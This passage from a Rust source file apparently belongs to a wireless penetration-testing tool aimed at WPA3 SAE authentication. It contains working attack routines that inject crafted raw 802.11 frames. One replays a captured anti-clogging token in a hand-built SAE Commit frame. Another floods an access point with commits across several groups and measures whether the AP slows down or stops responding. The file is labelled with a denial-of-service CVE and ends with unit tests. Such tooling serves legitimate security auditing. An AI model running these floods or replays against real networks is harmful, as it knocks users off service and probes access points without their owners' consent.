        Wpa3Verdict::Vulnerable
    } else {
        result.detail = "AP rejected reflected Commit".to_string();
        Wpa3Verdict::NotVulnerable
    };
}

// === Anti-clogging Token Replay ===
fn run_token_replay(
    shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
    our_mac: &MacAddress, result: &mut Wpa3TestResult,
    info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>, attack_start: Instant,
) {
    update_phase(info, Wpa3Phase::Probing);

    // Phase 1: Trigger anti-clogging token with rapid commits
    for _ in 0..10 {
        if !running.load(Ordering::SeqCst) { return; }
        send_sae_commit(shared, bssid, our_mac, 19, false, info);
        result.frames_sent += 1;
        thread::sleep(Duration::from_millis(10));
    }

    // Check for token response
    let mut token: Option<Vec<u8>> = None;
    for _ in 0..20 {
        if !running.load(Ordering::SeqCst) { return; }
        if let Some((status, _, data)) = wait_sae_response(
            reader, bssid, Duration::from_millis(100), running, info, params.rx_poll_timeout,
        ) {
            result.frames_received += 1;
            if status == sae_status::ANTI_CLOGGING_TOKEN_REQUIRED && data.len() > 30 {
                token = Some(data[30..].to_vec());
                push_event(events, attack_start, Wpa3EventKind::TokenTriggered);
                break;
            }
        }
    }

    let token = match token {
        Some(t) => t,
        None => {
            result.verdict = Wpa3Verdict::NotVulnerable;
            result.detail = "AP did not send anti-clogging token".to_string();
            return;
        }
    };

    // Phase 2: Replay the token after a delay
    thread::sleep(Duration::from_millis(500));

    // Build a new commit with the captured token
    // Token goes BEFORE scalar in 802.11-2020 SAE Commit
    let scalar_len = sae_scalar_len(19);
    let element_len = scalar_len * 2;
    let mut frame = Vec::with_capacity(30 + 2 + token.len() + scalar_len + element_len);

    frame.push(0xB0);
    frame.push(0x00);
    frame.extend_from_slice(&[0x3A, 0x01]);
    frame.extend_from_slice(bssid.as_bytes());
    frame.extend_from_slice(our_mac.as_bytes());
    frame.extend_from_slice(bssid.as_bytes());
    frame.extend_from_slice(&[0x00, 0x00]);
    frame.extend_from_slice(&3u16.to_le_bytes()); // SAE
    frame.extend_from_slice(&1u16.to_le_bytes()); // Commit
    frame.extend_from_slice(&0u16.to_le_bytes()); // Success
    frame.extend_from_slice(&19u16.to_le_bytes()); // Group 19
    frame.extend_from_slice(&token); // Token
    let mut scalar = vec![0u8; scalar_len];
    fill_pseudo_random(&mut scalar);
    frame.extend_from_slice(&scalar);
    let mut element = vec![0u8; element_len];
    fill_pseudo_random(&mut element);
    frame.extend_from_slice(&element);

    if shared.tx_frame(&frame, &TxOptions::default()).is_ok() {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_sent += 1;
        result.frames_sent += 1;
    }

    let accepted = if let Some((status, got_commit, _)) = wait_sae_response(
        reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
    ) {
        result.frames_received += 1;
        got_commit || status == 0
    } else {
        false
    };

    push_event(events, attack_start, Wpa3EventKind::TokenReplayResult { accepted });

    result.verdict = if accepted {
        result.detail = "token accepted after replay — check time-binding".to_string();
        Wpa3Verdict::Vulnerable
    } else {
        result.detail = "token rejected after replay — properly time-limited".to_string();
        Wpa3Verdict::NotVulnerable
    };
}

// === Commit Flood DoS (CVE-2019-9497) ===
fn run_commit_flood(
    shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
    our_mac: &MacAddress, result: &mut Wpa3TestResult,
    info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
    running: &Arc<AtomicBool>, attack_start: Instant,
) {
    update_phase(info, Wpa3Phase::Flooding);

    let delay = if params.flood_rate > 0 {
        Duration::from_micros(1_000_000 / params.flood_rate as u64)
    } else {
        Duration::from_millis(1)
    };

    // Take baseline measurement
    let baseline_start = Instant::now();
    send_sae_commit(shared, bssid, our_mac, 19, false, info);
    let _baseline_response = wait_sae_response(
        reader, bssid, params.commit_timeout, running, info, params.rx_poll_timeout,
    );
    let baseline_us = baseline_start.elapsed().as_micros() as f64;

    let mut sent: u32 = 0;
    let mut responded: u32 = 0;
    let mut tokens: u32 = 0;
    let groups: &[u16] = &[19, 20, 21];
    let rate_start = Instant::now();

    while running.load(Ordering::SeqCst) && (params.flood_count == 0 || sent < params.flood_count) {
        let group = groups[sent as usize % groups.len()];
        if send_sae_commit(shared, bssid, our_mac, group, false, info) {
            sent += 1;
            result.frames_sent += 1;
        }

        // Non-blocking check for responses
        if let Some(frame) = reader.recv_timeout(Duration::from_millis(1)) {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_received += 1;
            result.frames_received += 1;
            if frame.raw.len() >= 30 && frame.raw[0] == 0xB0 {
                responded += 1;
                let status = u16::from_le_bytes([frame.raw[28], frame.raw[29]]);
                if status == sae_status::ANTI_CLOGGING_TOKEN_REQUIRED {
                    tokens += 1;
                }
            }
        }

        if sent % 50 == 0 {
            let elapsed_secs = rate_start.elapsed().as_secs_f64();
            let rate = if elapsed_secs > 0.0 { sent as f64 / elapsed_secs } else { 0.0 };
            push_event(events, attack_start, Wpa3EventKind::FloodProgress {
                sent, responded, tokens, rate,
            });
        }

        thread::sleep(delay);
    }

    result.flood_sent = sent;
    result.flood_responded = responded;
    result.flood_tokens_triggered = tokens;

    // Post-flood: measure degradation
    thread::sleep(Duration::from_millis(500));
    let post_start = Instant::now();
    send_sae_commit(shared, bssid, our_mac, 19, false, info);
    let post_response = wait_sae_response(
        reader, bssid, Duration::from_secs(4), running, info, params.rx_poll_timeout,
    );
    let post_us = post_start.elapsed().as_micros() as f64;

    let dos_effective = if post_response.is_none() {
        true // AP didn't respond at all
    } else if baseline_us > 0.0 {
        post_us > baseline_us * 1.5 // Significant degradation
    } else {
        false
    };

    result.verdict = if dos_effective {
        result.detail = format!("{} commits, AP {} ({}ms → {}ms)",
            sent,
            if post_response.is_none() { "unresponsive" } else { "degraded" },
            (baseline_us / 1000.0) as u64, (post_us / 1000.0) as u64);
        Wpa3Verdict::Vulnerable
    } else {
        result.detail = format!("{} commits, {} responded, {} tokens triggered",
            sent, responded, tokens);
        Wpa3Verdict::NotVulnerable
    };
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════════

fn sae_scalar_len(group_id: u16) -> usize {
    match group_id {
        19 | 28 => 32, // P-256, BP-256
        20 | 29 => 48, // P-384, BP-384
        21 => 66,      // P-521
        30 => 64,      // BP-512
        _ => 32,
    }
}

/// Simple xorshift32 PRNG for generating random scalars/elements.
/// NOT cryptographically secure — that's fine, we're sending invalid data anyway.
fn fill_pseudo_random(buf: &mut [u8]) {
    static SEED: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
    let mut state = SEED.load(Ordering::Relaxed);
    if state == 0 {
        state = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or(Duration::from_secs(42))
            .as_millis() as u32;
    }
    for b in buf.iter_mut() {
        state ^= state << 13;
        state ^= state >> 17;
        state ^= state << 5;
        *b = (state & 0xFF) as u8;
    }
    SEED.store(state, Ordering::Relaxed);
}

fn push_event(events: &Arc<EventRing<Wpa3Event>>, start: Instant, kind: Wpa3EventKind) {
    let seq = events.seq() + 1;
    events.push(Wpa3Event { seq, timestamp: start.elapsed(), kind });
}

fn update_phase(info: &Arc<Mutex<Wpa3Info>>, phase: Wpa3Phase) {
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.phase = phase;
    info.elapsed = info.start_time.elapsed();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wpa3_params_default() {
        let p = Wpa3Params::default();
        assert_eq!(p.mode, Wpa3Mode::FullScan);
        assert_eq!(p.timing_samples, 50);
        assert_eq!(p.flood_count, 500);
        assert_eq!(p.flood_rate, 100);
        assert_eq!(p.commit_timeout, Duration::from_secs(2));
        assert_eq!(p.groups, vec![19, 20, 21]);
    }

    #[test]
    fn test_wpa3_info_default() {
        let info = Wpa3Info::default();
        assert_eq!(info.phase, Wpa3Phase::Idle);
        assert!(!info.running);
        assert_eq!(info.commits_sent, 0);
    }

    #[test]
    fn test_mode_parse() {
        assert_eq!(Wpa3Mode::from_str("timing"), Some(Wpa3Mode::Timing));
        assert_eq!(Wpa3Mode::from_str("cve-2019-9494"), Some(Wpa3Mode::Timing));
        assert_eq!(Wpa3Mode::from_str("flood"), Some(Wpa3Mode::CommitFlood));
        assert_eq!(Wpa3Mode::from_str("curve"), Some(Wpa3Mode::InvalidCurve));
        assert_eq!(Wpa3Mode::from_str("reflection"), Some(Wpa3Mode::Reflection));
        assert_eq!(Wpa3Mode::from_str("full"), Some(Wpa3Mode::FullScan));
        assert_eq!(Wpa3Mode::from_str("garbage"), None);
    }

    #[test]
    fn test_all_tests_count() {
        assert_eq!(Wpa3Mode::all_tests().len(), 7);
    }

    #[test]
    fn test_mode_cve_strings() {
        for mode in Wpa3Mode::all_tests() {
            assert!(!mode.label().is_empty());
            assert!(!mode.cve().is_empty());
            assert!(!mode.description().is_empty());
        }
    }

    #[test]
    fn test_wpa3_attack_new() {
        let attack = Wpa3Attack::new(Wpa3Params::default());
        assert!(!attack.is_running());
        assert!(!attack.is_done());
        assert_eq!(attack.name(), "wpa3");
    }

    #[test]
    fn test_sae_scalar_len() {
        assert_eq!(sae_scalar_len(19), 32);
        assert_eq!(sae_scalar_len(20), 48);
        assert_eq!(sae_scalar_len(21), 66);
        assert_eq!(sae_scalar_len(28), 32);
        assert_eq!(sae_scalar_len(30), 64);
    }

    #[test]
    fn test_fill_pseudo_random() {
        let mut buf = [0u8; 32];
        fill_pseudo_random(&mut buf);
        // Should not be all zeros after filling
        assert!(buf.iter().any(|&b| b != 0));
    }

    #[test]
    fn test_wpa3_event_ring() {
        let ring = EventRing::<Wpa3Event>::new(16);
        ring.push(Wpa3Event {
            seq: 1, timestamp: Duration::from_millis(100),
            kind: Wpa3EventKind::ChannelLocked { channel: 6 },
        });
        assert_eq!(ring.drain().len(), 1);
    }

    #[test]
    fn test_wpa3_test_result_new() {
        let r = Wpa3TestResult::new(Wpa3Mode::Timing);
        assert_eq!(r.mode, Wpa3Mode::Timing);
        assert_eq!(r.verdict, Wpa3Verdict::Pending);
        assert_eq!(r.timing_cv, 0.0);
    }
}
